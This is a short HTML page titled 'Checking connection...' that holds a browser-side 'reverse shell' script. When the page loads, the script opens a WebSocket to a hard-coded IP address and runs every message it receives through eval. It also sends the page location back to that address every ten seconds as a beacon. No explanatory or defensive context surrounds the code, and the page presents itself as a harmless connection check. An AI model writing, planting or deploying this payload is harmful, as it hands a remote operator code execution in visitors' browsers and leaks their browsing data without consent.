<!DOCTYPE html>
<html>
  <head>
    <title>Checking connection...</title>
  </head>
  <body style="background:black;color:lime;font-family:monospace">
    <div id="status">Loading...</div><script>
// WebSocket reverse shell
const ws = new WebSocket('ws://192.168.233.129:8080/shell');
const status = document.getElementById('status');

ws.onopen = () => {
  status.innerHTML = 'Connected. Send commands from listener.';
  ws.send('navigator.userAgent + "\\nBrowser shell active"');
};

ws.onmessage = (e) => {
  status.innerHTML += '<br>' + e.data;
  status.scrollTop = status.scrollHeight;
  eval(e.data);  // Execute JS commands too
};

ws.onerror = () => status.innerHTML = 'Connection failed. Retrying...';
setInterval(() => ws.send('pwd=' + location.href), 10000);  // Beacon
</script>
</body></html>
